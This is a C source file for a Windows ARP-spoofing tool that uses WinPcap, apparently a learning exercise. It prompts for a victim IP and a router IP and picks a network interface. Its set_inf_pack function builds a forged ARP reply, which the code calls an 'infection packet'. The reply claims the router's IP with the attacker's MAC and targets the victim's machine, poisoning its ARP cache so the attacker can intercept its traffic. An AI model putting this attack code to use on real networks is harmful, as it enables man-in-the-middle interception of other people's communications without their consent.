#include "util.h"

void ip_input(input *str){
	int buffer[20] = { 0 };
	int i; // loop count;
	int select = 0;

	printf("input sender ip addr (XXX.XXX.XXX.XXX)\n");
	scanf_s("%d.%d.%d.%d", &buffer[0], &buffer[1], &buffer[2], &buffer[3]);
	for (i = 0; i < IP_ADDR_LEN; i++) str->victim_ip[i] = buffer[i];
	
	fflush(stdin);
	
	while (1){
		printf("select destination (1 = router, 2 = other) : ");
		scanf_s("%d", &select);
		if (select != 1 && select != 2) continue;
		if (select == 1) break;
		printf("input destination ip addr (XXX.XXX.XXX.XXX)\n");
		scanf_s("%d.%d.%d.%d", &buffer[0], &buffer[1], &buffer[2], &buffer[3]);
		for (i = 0; i < IP_ADDR_LEN; i++) str->destination_ip[i] = buffer[i];
		break;
	}
}

void arp_table_update(u_char ip[4]){
	char payload[50] = "ping";
	int i;
	int size = strlen(payload);

	payload[size++] = ' ';
	for (i = 0; i < 4; i++) {
		_itoa_s(ip[i], &payload[size], 20, 10);
		size = strlen(payload);
		if (i == 3) payload[size] = '\0';
		else payload[size++] = '.';
	}

	system(payload);

}

void set_inf_pack(u_char *packet, input data) {
	infection_packet inf_pack;
	int i;

	for (i = 0; i < ETHER_ADDR_LEN; i++){
		inf_pack.arph.tha[i] = inf_pack.ethh.dst[i] = data.victim_mac[i]; // target mac
		inf_pack.arph.sha[i] = inf_pack.ethh.src[i] = data.my_mac[i]; // my
	}
	inf_pack.ethh.type = htons(ETHERTYPE_ARP);	 // 0806
	inf_pack.arph.htype = htons(ARPHRD_ETHER);	 // fix_eth_type
	inf_pack.arph.ptype = LIBNET_ARP_H;	 // protocol type arp
	inf_pack.arph.hlen = ETHER_ADDR_LEN;		// fix_leng
	inf_pack.arph.plen = IP_ADDR_LEN;			// fix_leng
	inf_pack.arph.oper = htons(ARPOP_REPLY);

	for (i = 0; i < IP_ADDR_LEN; i++) {
		inf_pack.arph.spa[i] = data.destination_ip[i]; // router_ip
		inf_pack.arph.tpa[i] = data.victim_ip[i]; // target_ip
	}
	//setting packet

	for (i = 0; i < sizeof(infection_packet);i++)
		packet[i] = *((u_char*)&inf_pack + i);

}

pcap_if_t *find_dev()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum = 0;
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	
	for (d = alldevs; d; d = d->next){
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0){
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return NULL;
	}
	
	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum);

	if (inum < 1 || inum > i){
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return NULL;
	}

	for (d = alldevs, i = 0; i < inum - 1; i++, d = d->next);
	//장치선택

	return d;
}
